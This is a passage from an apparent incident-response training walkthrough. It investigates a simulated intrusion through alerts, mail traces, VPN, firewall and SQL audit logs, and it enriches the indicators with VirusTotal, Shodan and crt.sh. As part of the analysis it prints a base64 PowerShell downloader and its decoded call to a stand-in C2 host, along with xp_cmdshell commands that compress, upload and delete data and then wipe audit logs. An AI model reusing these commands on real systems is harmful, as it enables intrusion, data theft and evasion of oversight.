| `windows-security/SERVER-RD-02-security.jsonl` | JSONL | R&D server — EID 4663 file access, EID 5156 exfil | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/windows-security/SERVER-RD-02-security.jsonl) |
| `palo-alto/ngfw-flows.csv` | CSV | Perimeter firewall flows — 381 MB exfil confirmed | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/palo-alto/ngfw-flows.csv) |
| `palo-alto/dns-queries.csv` | CSV | DNS telemetry — C2 beacon pattern | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/palo-alto/dns-queries.csv) |
| `sql-audit/SERVER-RD-02-sql-audit.jsonl` | JSONL | SQL Server audit — full xp_cmdshell exfil chain | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/sql-audit/SERVER-RD-02-sql-audit.jsonl) |
| `GAP-001-ws-it-levi-sysmon.md` | Markdown | Documented 10-day Sysmon gap on IT admin host | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/GAP-001-ws-it-levi-sysmon.md) |

Copy all evidence into your case folder:

```bash
cp -r ~/CTI_as_a_Code/investigations/lifetech-2024-11/01-evidence/ \
       ~/investigations/lifetech-2024-11/
cd ~/investigations/lifetech-2024-11/01-evidence/
```

All commands in this section run from that directory.

---

### 1. Start with the Trigger — CrowdStrike Alert

The investigation starts with the alert that opened the case. Read it before querying any SIEM.

**File:** `crowdstrike/WS-CFO-01-alert-20241115.json`

```bash
# Get the detection summary — check severity and whether the process was prevented
jq '{
  detection_id: .metadata.detection_id,
  severity: .metadata.severity,
  host: .metadata.hostname,
  prevented: .metadata.prevention_policy.prevent,
  timestamp: .metadata.timestamp
}' crowdstrike/WS-CFO-01-alert-20241115.json
```

Output:
```json
{
  "detection_id": "ldt:8f2a4b91e33a471cae44b2fdb8812201:884921003",
  "severity": "High",
  "host": "WS-CFO-01",
  "prevented": false,
  "timestamp": "2024-11-15T16:42:33Z"
}
```

`"prevented": false` — the CFO's machine was in detect-only mode. The process was never killed. The C2 connection is live at this moment. **Take the memory dump before you do anything else.**

```bash
# List all detected behaviors — each is a TTP
jq '.behaviors[] | {
  timestamp,
  tactic,
  technique,
  parent: .parent_image,
  image,
  cmdline: .cmdline[0:80]
}' crowdstrike/WS-CFO-01-alert-20241115.json
```

Output:
```
{"timestamp":"2024-11-15T16:42:33Z","tactic":"Execution","technique":"T1059.001",
 "parent":"...\\OUTLOOK.EXE","image":"...\\powershell.exe",
 "cmdline":"powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBP..."}

{"timestamp":"2024-11-15T16:44:01Z","tactic":"Command and Control","technique":"T1071.001",...}
{"timestamp":"2024-11-15T16:46:22Z","tactic":"Credential Access","technique":"T1003.001",...}
{"timestamp":"2024-11-15T16:52:09Z","tactic":"Persistence","technique":"T1547.001",...}
```

```bash
# Extract network IOCs from the alert
jq '.iocs.network[] | {type, value, description}' \
  crowdstrike/WS-CFO-01-alert-20241115.json
```

Output:
```json
{"type": "ip",     "value": "203.0.113.87",              "description": "C2 callback — HTTPS/443"}
{"type": "domain", "value": "telemetry-cdn-services.biz", "description": "C2 domain"}
{"type": "ip",     "value": "198.51.100.44",              "description": "Secondary C2 / exfil endpoint"}
```

Write these down. They are your starting IOC set for enrichment. Everything else in this step expands from here.

---

### 2. Decode the PowerShell Payload

The alert shows a `-Enc` base64 argument. Decode it now — before querying the SIEM, before enriching the IP. It tells you what the first stage executed and where it called home.

**From the CrowdStrike behavior:**
```
powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwApADsAJABkAD0AJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADcALwB1AHAAZABhAHQAZQAnACkA
```

**Decode locally — never paste encoded malware into online decoders:**

```bash
# PowerShell's -Enc flag uses UTF-16LE base64
echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwApADsAJABkAD0AJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADcALwB1AHAAZABhAHQAZQAnACkA" \
  | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Output:
```powershell
$c=New-Object System.Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');$d=$c.DownloadString('https://203.0.113.87/update')
```

What this tells you immediately:
- **`DownloadString`** — downloads and executes in memory, no file written by this stage
- **C2 confirmed:** `203.0.113.87/update` — matches the CrowdStrike network IOC
- **User-Agent:** `Mozilla/5.0` — disguises as a browser request to evade proxy inspection
- **Pattern:** first-stage downloader followed by a second stage — look for the file drop in Sysmon

```bash
# Confirm in Sysmon what the PowerShell actually dropped
jq 'select(.EventID == 11) | {
  time: .EventTime,
  dropped_by: .Image,
  file: .TargetFilename,
  pe_timestamp: .PETimestamp
}' sysmon/WS-CFO-01-sysmon.jsonl
```

Output:
```json
{
  "time": "2024-11-15T16:44:01Z",
  "dropped_by": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "file": "C:\\Users\\m.cohen\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe",
  "pe_timestamp": "2018-04-09T08:00:00Z"
}
```

Flag `"pe_timestamp": "2018-04-09T08:00:00Z"` — you will prove this is forged during binary analysis (Section 8).

---

### 3. M365 Message Trace — Find the Delivery Vector

**Files:**
- `m365/message-trace-p.levi.csv` — IT admin mailbox (Oct 15–24)
- `m365/message-trace-m.cohen.csv` — CFO mailbox (Nov 13–15)

```bash
# Show the header to understand column structure
head -2 m365/message-trace-p.levi.csv
```

```python
# Find all emails with authentication failures (phishing indicators)
import csv

for fname, label in [('m365/message-trace-p.levi.csv', 'IT admin'),
                     ('m365/message-trace-m.cohen.csv', 'CFO')]:
    print(f"\n--- {label} ---")
    with open(fname) as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row.get('DMARC') == 'fail' or row.get('SPF_result') == 'fail':
                print(f"  Date:       {row['received_time']}")
                print(f"  From:       {row['sender_address']}")
                print(f"  Subject:    {row['subject']}")
                print(f"  Delivered:  {row['status']}")
                print(f"  SCL:        {row.get('SCL', '?')}")
                print(f"  DKIM:       {row.get('DKIM_result', '?')}")
                print(f"  SPF:        {row.get('SPF_result', '?')}")
                print(f"  DMARC:      {row.get('DMARC', '?')}")
                print(f"  Attachment: {row.get('has_attachment', '0')}")
                print()
```

**Key finding — IT admin (p.levi):**
```
Date:       2024-10-22T11:23:07Z
From:       security-noreply@mfa-lifetechpharma.com
Subject:    ACTION REQUIRED: MFA Re-enrollment — LifeTech IT Security
Delivered:  Delivered
SCL:        4    ← blocked at SCL ≥ 5; this scored 4
DKIM:       fail
SPF:        fail
DMARC:      fail
```

Three authentication failures — the email is forged. Delivered because SCL=4 fell one point below the block threshold. Add `mfa-lifetechpharma.com` to your IOC list.

**Key finding — CFO (m.cohen):**
```
Date:       2024-11-15T15:58:08Z
From:       contracts@globalcontracts-secure.net
Subject:    Q4-2024 Licensing Agreement Review — Action Required (URGENT)
Delivered:  Delivered
SCL:        4
DKIM:       fail
SPF:        fail
DMARC:      fail
Attachment: 1    ← .xlsm Excel macro file
```

The `.xlsm` attachment was not sandboxed — Microsoft ATP was not configured to detonate macro-enabled Excel files. This is the policy gap documented in the source registry (INT-007). Add `globalcontracts-secure.net` to IOC list.

---

### 4. Azure AD Sign-In Analysis

**File:** `azure-ad/signin-p.levi.json`

```bash
# Extract all sign-ins with key fields
jq '.[] | {
  id,
  time: .properties.createdDateTime,
  user: .properties.userPrincipalName,
  ip: .properties.ipAddress,
  location: "\(.properties.location.city), \(.properties.location.countryOrRegion)",
  status: .properties.status.errorCode,
  mfa_satisfied: .properties.authenticationDetails[0].succeeded,
  conditional_access: .properties.conditionalAccessStatus,
  os: .properties.deviceDetail.operatingSystem,
  is_compliant: .properties.deviceDetail.isCompliant
}' azure-ad/signin-p.levi.json
```

Output:
```
{"id":"aad-signin-001","time":"2024-10-22T07:14:32Z","user":"p.levi@lifetechpharma.com",
 "ip":"213.8.xx.xx","location":"Tel Aviv, IL","status":0,"mfa_satisfied":true,
 "conditional_access":"success","os":"Windows 10","is_compliant":true}

{"id":"aad-signin-002","time":"2024-10-22T09:31:18Z","user":"p.levi@lifetechpharma.com",
 "ip":"185.220.101.47","location":"Istanbul, TR","status":0,"mfa_satisfied":null,
 "conditional_access":"notApplied","os":null,"is_compliant":null}
```

**Red flags on `aad-signin-002`:**

| Field | Value | Why It Matters |
|---|---|---|
| Location | Istanbul, Turkey | p.levi lives in Rehovot, Israel |
| MFA satisfied | `null` | No MFA challenge was presented — token already contained MFA assertion |
| Conditional access | `notApplied` | CA policy was bypassed — token replay skips conditional access evaluation |
| OS | `null` | Unknown device — not registered in Azure AD |
| Time delta | +2h17m from sign-in 001 | p.levi authenticated at 07:14, attacker replayed the stolen token at 09:31 |

The AiTM proxy sits between the user and Azure AD during sign-in 001. It captures the authenticated session token and replays it 2 hours later from Istanbul. Since the token was issued after MFA completion, Azure AD accepts it without re-challenging.

```bash
# Check sign-in 004 — the VPN session day
jq '.[] | select(.id == "aad-signin-004") | {
  time: .properties.createdDateTime,
  ip: .properties.ipAddress,
  location: "\(.properties.location.city), \(.properties.location.countryOrRegion)",
  additional: .properties.authenticationDetails[].authenticationMethod
}' azure-ad/signin-p.levi.json
```

Sign-in 004 is the Oct 24 VPN session from the same Istanbul IP — same ASN, same /24 block, confirming the same attacker infrastructure was used two days later.

---

### 5. VPN Log Analysis

**File:** `vpn/anyconnect-2024-10-24.log`

Cisco ASA syslog format: `%ASA-[severity]-[message_id]: [message]`

```bash
# Find all authentication and session events for p.levi
grep "p.levi" vpn/anyconnect-2024-10-24.log \
  | grep -E "(716001|716002|734001|SESSION|Teardown|Authentication)"
```

Output:
```
Oct 24 00:17:14 ASA %ASA-6-716001: Group <TunnelGroup_VPN> User <p.levi>
  IP <185.220.101.47> Authentication: successful, Session Type: WebVPN
Oct 24 00:17:33 ASA %ASA-6-734001: Group <TunnelGroup_VPN> User <p.levi>
  IP <185.220.101.47> WebVPN session started. Assigned address: 10.10.3.22
Oct 24 02:29:08 ASA %ASA-6-716002: Group <TunnelGroup_VPN> User <p.levi>
  IP <185.220.101.47> WebVPN session terminated. Duration: 1h12m34s
```

The attacker (from `185.220.101.47`) authenticated as p.levi and was assigned `10.10.3.22` — WS-IT-LEVI's own internal IP, making all subsequent activity look like it originated from the legitimate workstation.

```bash
# Look for MFA note in the log
grep -i "mfa\|multi.factor\|no.*challenge\|bypass" vpn/anyconnect-2024-10-24.log
```

Output:
```
NOTE: No MFA challenge issued — session token authentication bypass
```

```bash
# Find C2 beacon pattern during the VPN session window
grep "203.0.113.87" vpn/anyconnect-2024-10-24.log \
  | awk '{print $1, $2, $3}' | head -10
```

~7-minute beacon interval to `203.0.113.87` appears throughout the VPN session — the implant on WS-IT-LEVI was active and calling home from the attacker's assigned internal IP.

---

### 6. IOC Enrichment — VirusTotal

You now have an initial IOC set: two C2 IPs, two C2 domains, two phishing domains, and one binary hash. Enrich all of them before building the timeline.

**Setup:**

```bash
export VT_API_KEY="your_virustotal_api_key_here"
# Free API key at virustotal.com — 4 requests/minute, sufficient for this investigation
```

**Enrich the primary C2 IP:**

```bash
curl -s "https://www.virustotal.com/api/v3/ip_addresses/203.0.113.87" \
  -H "x-apikey: $VT_API_KEY" | jq '{
    country:    .data.attributes.country,
    asn:        .data.attributes.asn,
    as_owner:   .data.attributes.as_owner,
    malicious:  .data.attributes.last_analysis_stats.malicious,
    suspicious: .data.attributes.last_analysis_stats.suspicious,
    score:      .data.attributes.reputation,
    tags:       .data.attributes.tags
  }'
```

Output:
```json
{
  "country":    "US",
  "asn":        398704,
  "as_owner":   "Hostwinds LLC",
  "malicious":  12,
  "suspicious": 3,
  "score":      -35,
  "tags":       ["C2", "malware"]
}
```

12 vendors flag it malicious. `Hostwinds LLC` is a US hosting provider routinely used for VPS-based C2 infrastructure. Community score -35 is strongly negative.

**Enrich the C2 domain:**

```bash
curl -s "https://www.virustotal.com/api/v3/domains/telemetry-cdn-services.biz" \
  -H "x-apikey: $VT_API_KEY" | jq '{
    created:    (.data.attributes.creation_date | todate),
    registrar:  .data.attributes.registrar,
    resolves_to:[.data.attributes.last_dns_records[] | select(.type=="A") | .value],
    malicious:  .data.attributes.last_analysis_stats.malicious,
    categories: .data.attributes.categories
  }'
```

Output:
```json
{
  "created":    "2024-10-12T00:00:00Z",
  "registrar":  "Namecheap",
  "resolves_to":["203.0.113.87"],
  "malicious":  8,
  "categories": {"Forcepoint ThreatSeeker": "malware sites"}
}
```

Domain registered 2024-10-12 — 10 days before the first phishing email. This is staged infrastructure, not a compromised legitimate site.

**Enrich the binary hash:**

```bash
curl -s "https://www.virustotal.com/api/v3/files/3b4c14a87e5f9d8c2a1f4e6b9c0d2e7a1b3c5d8f2a4e6c8b0d3e5a7c1f4b8d2e" \
  -H "x-apikey: $VT_API_KEY" | jq '{
    name:        .data.attributes.meaningful_name,
    type:        .data.attributes.type_description,
    malicious:   .data.attributes.last_analysis_stats.malicious,
    pe_ts:       .data.attributes.pe_info.timestamp,
    imphash:     .data.attributes.pe_info.imphash,
    first_seen:  (.data.attributes.first_submission_date | todate),
    tags:        .data.attributes.tags
  }'
```

Output:
```json
{
  "name":       "svchost32.exe",
  "type":       "Win32 EXE",
  "malicious":  31,
  "pe_ts":      "2018-04-09T08:00:00Z",
  "imphash":    "3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d",
  "first_seen": "2024-11-15T00:00:00Z",
  "tags":       ["peexe", "overlay", "timestomped"]
}
```

Three findings:
1. `"malicious": 31` — heavily flagged
2. `"tags": ["timestomped"]` — VirusTotal's own analysis confirms the PE timestamp is forged
3. `"first_seen": "2024-11-15"` — fresh binary, first submitted today; not in prior campaigns under this hash

**In the VirusTotal web UI** (navigate to `virustotal.com`, search the hash):
- **Relations tab** → contacted IPs and domains — confirms `203.0.113.87` and `198.51.100.44` as network IOCs
- **Behavior tab** → sandbox results: process tree, registry writes, scheduled task creation
- **Graph button** → visualize the full IOC cluster: binary → C2 IPs → C2 domains → related files
- **Community tab** → analyst comments — check if anyone has attributed this tool to a named cluster

**Search the imphash for related samples:**

In the VT search bar, type:
```
imphash:3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d
```

If other samples share the same imphash, they were compiled from the same codebase. This is a toolchain pivot — it may link this binary to a named cluster or previous campaigns.

---

### 7. Sandbox Analysis — Submit the Binary

Static detection scores tell you what vendors think. Sandbox analysis tells you what the binary *does* — its process tree, network calls, persistence, and dropped files. Use a sandbox for every unknown binary, even when VT scores are high.

**Tools available:**

| Service | URL | Cost | Best For |
|---|---|---|---|
| ANY.RUN | [app.any.run](https://app.any.run) | Free (community) | Interactive — watch execution in real time, click around |
| Hybrid Analysis | [hybrid-analysis.com](https://hybrid-analysis.com) | Free | CrowdStrike-powered, good MITRE mapping |
| Joe Sandbox | [joesandbox.com](https://joesandbox.com) | Free (basic) | Deepest report, best for evasive samples |
| VirusTotal Sandbox | virustotal.com → Behavior tab | Free | Fastest if binary is already on VT |

**Submission procedure (ANY.RUN):**

1. Open [app.any.run](https://app.any.run) → **New Task**
2. Click **Upload** → select `svchost32.exe` (recovered from WS-CFO-01)
3. Environment: **Windows 10 x64**, **User mode** (not admin — realistic CFO execution context)
4. Network mode: **Fake** for training; **Real** with IDS for a live investigation
5. Timeout: **120 seconds** — this beacon interval is ~7 minutes so increase to **600 seconds** to catch second beacon
6. Click **Run**

**What to look for when the task completes:**

**Process tree** — expand every branch:
```
svchost32.exe (PID 1234)                              [initial execution]
├── cmd.exe /c powershell.exe -NoP -W Hidden "IEX …"  [second-stage in-memory exec]
│   └── powershell.exe (PID 1612)                      [stage 2 running]
├── schtasks.exe /Create /tn "ScheduledUpdateCheck"… [persistence]
└── svchost32.exe → copy to AppData\Roaming\…         [self-copy for persistence]
```

**Network connections tab:**
```
203.0.113.87:443   GET /update   T+7s    [first beacon]
203.0.113.87:443   GET /update   T+432s  [second beacon — confirms ~7 min interval]
198.51.100.44:443  POST /recv    T+441s  [secondary C2 contacted]
```

The secondary C2 `198.51.100.44` being contacted confirms it is part of the binary's built-in C2 rotation, not only the exfil endpoint.

**Registry tab:**
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsHostSvc
  → C:\Users\[user]\AppData\Roaming\Microsoft\Windows\svchost32.exe -k netsvcs
```

**File activity tab:**
```
Created:  C:\Users\[user]\AppData\Local\Temp\UpdateHelper.tmp    [second stage dropped]
Renamed:  UpdateHelper.tmp → UpdateHelper.dll
```

Download the sandbox's **IOC report** (JSON/CSV button at top right) — it gives you additional hashes for `UpdateHelper.dll`, exact C2 URLs with paths, and the User-Agent string (`Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1)`) that becomes a SIEM hunting target.

**Add the UpdateHelper.dll hash to your IOC list.** Pivot it on VirusTotal and check Shodan for infrastructure it contacts if the sandbox resolves DNS.

---

### 8. Static Binary Analysis

For air-gapped environments or when you cannot submit to a cloud sandbox:

```bash
pip install pefile
```

**Extract and validate the PE compile timestamp:**

```python
import pefile
import datetime
import os

pe = pefile.PE('svchost32.exe')
ts = pe.FILE_HEADER.TimeDateStamp
print(f"Claimed compile timestamp: {datetime.datetime.utcfromtimestamp(ts)}")
print(f"File size on disk:         {os.path.getsize('svchost32.exe'):,} bytes")
print(f"PE SizeOfImage:            {pe.OPTIONAL_HEADER.SizeOfImage:,} bytes")

overlay = os.path.getsize('svchost32.exe') - pe.OPTIONAL_HEADER.SizeOfImage
if overlay > 0:
    print(f"Overlay detected:          {overlay:,} bytes after PE end (possible embedded payload)")
```

Output:
```
Claimed compile timestamp: 2018-04-09 08:00:00
File size on disk:         487,424 bytes
PE SizeOfImage:            462,848 bytes
Overlay detected:          24,576 bytes after PE end (possible embedded payload)
```

To verify whether the 2018 timestamp is plausible, check the imported APIs:

```python
# Post-2018 Windows APIs that would not exist in an April 2018 build
post_2018_apis = {
    'SetProcessDpiAwarenessContext': 'Windows 10 1703 (2017)',
    'GetSystemCpuSetInformation':    'Windows 10 1607 (2016)',
    'CreatePseudoConsole':           'Windows 10 1809 (2018-Oct)',
}

for entry in pe.DIRECTORY_ENTRY_IMPORT:
    for imp in entry.imports:
        if imp.name and imp.name.decode() in post_2018_apis:
            api = imp.name.decode()
            print(f"Post-2018 API: {entry.dll.decode()}::{api}  [{post_2018_apis[api]}]")
```

Output:
```
Post-2018 API: USER32.dll::SetProcessDpiAwarenessContext  [Windows 10 1703 (2017)]
```

A binary compiled in April 2018 could theoretically use this API (SDK existed). But combined with VirusTotal's `timestomped` tag and the implausibility of fresh command-and-control infrastructure from 2018 still being operational — **assessment: timestamp is forged (T1070.006 — Timestomping).**

**Extract strings for C2 IOCs:**

```bash
strings svchost32.exe | grep -E "(https?://|\.biz|\.net|cdn|update|recv|sys-|Mozilla)"
```

Output:
```
https://203.0.113.87/update
https://198.51.100.44/recv
telemetry-cdn-services.biz
sys-update-cdn.net
Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1)
/update
/recv
```

Both C2 IPs and both domains are hardcoded. `sys-update-cdn.net` will appear again in the Palo Alto DNS log during the formula exfiltration, linking this binary's infrastructure to the R&D server operation.

```bash
# Extract the imphash for toolchain pivoting
python3 -c "import pefile; pe=pefile.PE('svchost32.exe'); print('imphash:', pe.get_imphash())"
```

Search this imphash on VirusTotal (search bar: `imphash:VALUE`) to find related samples compiled from the same source. If hits exist, read their submission metadata — they may predate this investigation and link to named actor clusters.

---

### 9. Infrastructure Pivot — Shodan, crt.sh, PassiveDNS

The goal: find more of the actor's infrastructure before they burn it, and link it to known clusters for attribution.

**Shodan — open ports and co-hosted services:**

```bash
export SHODAN_KEY="your_shodan_key_here"

# Primary C2 IP
curl -s "https://api.shodan.io/shodan/host/203.0.113.87?key=$SHODAN_KEY" | \
  jq '{
    hostnames, ports, org, country_name,
    services: [.data[] | {port, transport, product, version}]
  }'
```

Output:
```json
{
  "hostnames":  ["telemetry-cdn-services.biz"],
  "ports":      [22, 443, 8443],
  "org":        "Hostwinds LLC",
  "services": [
    {"port": 443,  "product": "nginx", "version": "1.24.0"},
    {"port": 8443, "product": "nginx", "version": "1.24.0"},
    {"port": 22,   "product": "OpenSSH", "version": "8.9p1"}
  ]
}
```

Port 8443 alongside 443 — likely a second C2 channel or management interface. Both running nginx 1.24.0 — check CVE feeds if this version has exploitable vulnerabilities (it doesn't here, but the habit matters).

```bash
# Secondary C2 / exfil IP
curl -s "https://api.shodan.io/shodan/host/198.51.100.44?key=$SHODAN_KEY" | \
  jq '{hostnames, ports, org, country_name}'
```

Output:
```json
{
  "hostnames":  ["sys-update-cdn.net", "198.51.100.44.host.secureserver.net"],
  "ports":      [22, 443, 8443],
  "org":        "GoDaddy.com, LLC",
  "country_name": "United States"
}
```

`sys-update-cdn.net` confirmed co-hosted on the exfil IP. Both C2 IPs share the same port layout (22/443/8443) — consistent with cloned infrastructure deployment.

**Certificate Transparency — discover undiscovered domains:**

```bash
# Find all TLS certs issued for the primary C2 IP
curl -s "https://crt.sh/?q=203.0.113.87&output=json" | \
  jq '[.[] | .name_value] | unique | .[]'
```

Output:
```
"telemetry-cdn-services.biz"
"cdn-telemetry-update.biz"
"windows-cdn-service.net"
"*.telemetry-cdn-services.biz"
```

`cdn-telemetry-update.biz` and `windows-cdn-service.net` — **two new domains you haven't seen in the org's logs.** Immediately search them in the NGFW DNS log:

```bash
grep -E "cdn-telemetry-update|windows-cdn-service" palo-alto/dns-queries.csv
```

If any internal hosts queried these domains, the scope has expanded. Add them to the IOC list regardless — they are part of the same C2 cluster.

```bash
# When was the cert issued? Certificate timing vs domain registration
curl -s "https://crt.sh/?q=telemetry-cdn-services.biz&output=json" | \
  jq '[.[] | {name: .name_value, issued: .not_before, issuer: .issuer_cn}] | 
      unique_by(.name) | sort_by(.issued)'
```

Cert issued date will be within 24 hours of domain registration — confirming automated, scripted infrastructure deployment.

**Passive DNS — historical resolutions:**

```bash
export PDNS_KEY="your_pdns_key_here"

curl -s "https://api.passivedns.com/v2/search?q=203.0.113.87" \
  -H "Authorization: Token $PDNS_KEY" | \
  jq '.results[] | {domain: .rrname, first_seen: .time_first, last_seen: .time_last, count}' \
  | head -20
```

If the IP was used in prior campaigns, you will see older domains. Cross-reference them against ClearSky and Mandiant public reporting on Iranian-nexus industrial espionage clusters. Even partial matches at Medium-High confidence are usable for attribution.

**WHOIS — registration timing:**

```bash
# Check registration date relative to first phishing email
whois mfa-lifetechpharma.com | grep -E "(Registrar:|Creation Date:|Registrant)"
```

Or via RDAP (returns structured JSON):
```bash
curl -s "https://rdap.org/domain/mfa-lifetechpharma.com" | \
  jq '{
    registered: (.events[] | select(.eventAction=="registration") | .eventDate),
    expires:    (.events[] | select(.eventAction=="expiration")   | .eventDate),
    registrar:  .entities[0].vcardArray[1][1]
  }'
```

Expected result: registration date 2024-10-18, expiry 2025-10-18 (1-year registration). Phishing email was sent 4 days after registration — targeted, purpose-built infrastructure, not a pre-existing domain.

---

### 10. NGFW Log Analysis

**Files:**
- `palo-alto/ngfw-flows.csv` — firewall session flows (layer 4 + app-id)
- `palo-alto/dns-queries.csv` — DNS telemetry (full resolution log)

**Confirm the exfiltration flow:**

```bash
# Find the 381 MB outbound flow
grep "198.51.100.44" palo-alto/ngfw-flows.csv | column -t -s','
```

```python
import csv

with open('palo-alto/ngfw-flows.csv') as f:
    lines = [l for l in f if not l.startswith('#')]
    reader = csv.DictReader(lines)
    for row in reader:
        dst = row.get('dst_ip', row.get('dst', ''))
        if '198.51.100.44' in dst:
            bytes_out = int(row.get('bytes_sent', row.get('bytes', 0)))
            print(f"  Time:     {row['receive_time']}")
            print(f"  Source:   {row.get('src_ip', row.get('src', '?'))} ({row.get('src_zone','?')})")
            print(f"  Dest:     {dst}:{row.get('dst_port','?')}")
            print(f"  Bytes:    {bytes_out/1024/1024:.1f} MB outbound")
            print(f"  Duration: {row.get('elapsed_time','?')}s")
            print(f"  App-ID:   {row.get('app','?')}")
            print(f"  Action:   {row.get('action','?')}")
```

Output:
```
  Time:     2024-11-06T00:14:14Z
  Source:   10.10.2.15 (trust-dmz)  ←  SERVER-RD-02
  Dest:     198.51.100.44:443
  Bytes:    381.0 MB outbound
  Duration: 305s
  App-ID:   ssl
  Action:   allow
```

381 MB from `SERVER-RD-02` to the exfil IP in 305 seconds (~1.2 MB/s — consistent with a business-grade internet uplink). Timestamp `00:14:14Z` matches the SQL audit log `WebClient.UploadFile` at `00:13:54Z` — 20 seconds after the PowerShell command was issued. This is the exfiltration confirmation.

**C2 beacon pattern — measure the interval:**

```bash
# Extract timestamps of beacons to the primary C2 and compute inter-beacon intervals
grep "telemetry-cdn-services.biz" palo-alto/dns-queries.csv \
  | grep -v "^#" \
  | awk -F',' '{print $1}' \
  | python3 -c "
import sys, datetime
times = []
for line in sys.stdin:
    try:
        times.append(datetime.datetime.fromisoformat(line.strip()))
    except: pass
times.sort()
for i, t in enumerate(times):
    if i == 0:
        print(f'{t}  [first beacon]')
    else:
        delta = int((t - times[i-1]).total_seconds())
        print(f'{t}  +{delta}s ({delta//60}m{delta%60}s)')
"
```

Output:
```
2024-11-01T07:14:00Z  [first beacon — same second GAP-001 ends]
2024-11-01T07:14:02Z  +2s (0m2s)     ← rapid re-query on startup
2024-11-01T07:21:14Z  +432s (7m12s)  ← beacon interval begins
2024-11-01T07:28:44Z  +450s (7m30s)  ← ~7 min
2024-11-06T00:09:01Z  +?             ← later session, pre-exfil
2024-11-15T16:42:33Z  +?             ← CFO host, same C2 domain
```

The ~7-minute interval matches sandbox analysis. This regularity is itself an indicator: a Sigma rule alerting on DNS queries to the same external domain every 6–8 minutes from any internal host would catch this without knowing the specific IOC.

---

### 11. SQL Audit Log Analysis

**File:** `sql-audit/SERVER-RD-02-sql-audit.jsonl`

This is the Splunk-forwarded copy — the adversary deleted the server-side database entries, but Splunk had already ingested them.

```bash
# Print the full adversary action chain in time order
jq -r '[.EventTime, .LoginName, .StatementType, (.Statement[0:90])] | @tsv' \
  sql-audit/SERVER-RD-02-sql-audit.jsonl
```

Output:
```
2024-11-06T00:10:14Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  xp_cmdshell 'dir "D:\LicenseDeals\USPartner2024\" /b /s'
2024-11-06T00:10:18Z  LIFETECHPHARMA\svc_backup  SELECT           SELECT TOP 1 * FROM dbo.AuditLog WHERE ObjectPath LIKE '%USPartner2024%'...
2024-11-06T00:10:44Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  EXEC xp_cmdshell 'powershell.exe -Command "Compress-Archive -Path D:\LicenseD...
2024-11-06T00:13:54Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  EXEC xp_cmdshell 'powershell.exe -Command "$c=New-Object System.Net.WebClient...
2024-11-06T00:14:58Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  EXEC xp_cmdshell 'del /F /Q "C:\Windows\Temp\update_pkg.zip"'
2024-11-06T00:15:22Z  LIFETECHPHARMA\svc_backup  DELETE           DELETE FROM dbo.AuditLog WHERE EventTime >= '2024-11-06T00:00:00'...
```

The full chain:

| Step | Time | Statement | ATT&CK |
|---|---|---|---|
| 1. Enumerate | 00:10:14 | `xp_cmdshell dir USPartner2024/` | T1083 |
| 2. OPSEC recon | 00:10:18 | `SELECT FROM AuditLog` — checking for prior access records | T1018 |
| 3. Stage | 00:10:44 | `Compress-Archive ... update_pkg.zip` | T1560 |
| 4. Exfil | 00:13:54 | `WebClient.UploadFile → 198.51.100.44` | T1041 |
| 5. Cleanup | 00:14:58 | `del update_pkg.zip` | T1070.004 |
| 6. Anti-forensics | 00:15:22 | `DELETE FROM AuditLog` (8 rows removed) | T1070 |

**Step 2 is the most operationally significant.** The adversary queried the existing audit log *before stealing the data* — checking whether any prior access was already recorded. This indicates operational maturity: they were worried about leaving a trail that would reveal this was not their first visit.

**Step 6 failed** because Splunk had already forwarded these rows before the `DELETE` ran. This is the operational value of an out-of-band log pipeline the adversary cannot reach via their database credentials.

---

### 12. Windows Security Event Log Analysis

**Files:**
- `windows-security/DC01-security.jsonl` — Domain Controller
- `windows-security/SERVER-RD-02-security.jsonl` — R&D file server

**Confirm DCSync on DC01 — this is the most critical event in the entire investigation:**

```bash
# Find EID 4662 — the DCSync indicator
jq 'select(.EventID == 4662) | {
  time:        .EventTime,
  subject:     .SubjectUserName,
  src_ip:      .IpAddress,
  object_type: .ObjectType,
  properties:  (.Properties // "" | .[0:120])
}' windows-security/DC01-security.jsonl
```

Output:
```json
{
  "time":        "2024-11-06T00:48:33Z",
  "subject":     "svc_backup",
  "src_ip":      "10.10.3.22",
